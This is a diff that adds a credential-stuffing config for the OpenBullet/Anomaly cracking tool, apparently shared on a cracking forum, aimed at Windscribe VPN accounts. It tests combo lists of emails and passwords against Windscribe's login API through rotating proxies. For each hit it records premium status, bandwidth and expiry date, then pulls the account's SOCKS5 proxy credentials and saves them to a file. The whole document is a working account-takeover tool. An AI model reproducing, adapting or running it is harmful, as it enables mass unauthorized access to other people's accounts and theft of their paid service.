@@ -1,0 +1,126 @@
+[SETTINGS]
+{
+  "Name": "Windscribe Private API #ModProxy",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-11T22:02:58.4980072+04:00",
+  "AdditionalInfo": "+REP me on cracked.to/savageshawn",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION CurrentUnixTime -> VAR "ct" 
+
+FUNCTION Hash MD5 "952b4412f002315aa50751032fcaab03<ct>" -> VAR "auth_hash" 
+
+REQUEST POST "https://api.windscribe.com/Session?platform=firefox" 
+  CONTENT "username=<USER>&password=<PASS>&time=<ct>&client_auth_hash=<auth_hash>&session_type_id=2" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api.windscribe.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: null" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "session_auth_hash" 
+  KEYCHAIN Failure OR 
+    KEY "errorCode" 
+
+IF "<USER>" Contains "@"
+
+PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "Username" 
+
+ENDIF
+
+PARSE "<SOURCE>" JSON "traffic_used" -> VAR "Used" 
+
+PARSE "<SOURCE>" JSON "traffic_max" -> VAR "Max" 
+
+IF "<Max>" EqualTo "-1"
+
+FUNCTION Replace "-1" "Unlimited" "<Max>" -> CAP "Bandwith" 
+
+PARSE "<SOURCE>" JSON "premium_expiry_date" CreateEmpty=FALSE -> CAP "Expiry" 
+
+ELSE
+
+FUNCTION Compute "(((<Used>/1024)/1024)/1024)" -> VAR "Used" 
+
+FUNCTION Round "<Used>" -> VAR "Used" 
+
+FUNCTION Compute "(((<Max>/1024)/1024)/1024)" -> VAR "Max" 
+
+FUNCTION Constant "<Used>GB/<Max>GB" -> CAP "Bandwith Used" 
+
+ENDIF
+
+PARSE "<SOURCE>" JSON "session_auth_hash" -> VAR "auth" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "is_premium\": 1" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "is_premium\": 0" 
+
+REQUEST GET "https://windscribe.com/getconfig/socks" 
+  
+  HEADER "Host: windscribe.com" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; vivo 1807) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.86 Mobile Safari/537.36" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cookie: ws_session_auth_hash=<auth>" 
+
+PARSE "<SOURCE>" LR "username:" "\\n" -> VAR "us" 
+
+PARSE "<SOURCE>" LR "password:" "\"" -> VAR "ps" 
+
+UTILITY File "Windscribe Socks5 Proxies.txt" AppendLines "socks-us.windscribe.com:1080:<us>:<ps>\\nsocks-nl.windscribe.com:1080:<us>:<ps>" -> VAR "Proxy Saver" 
+
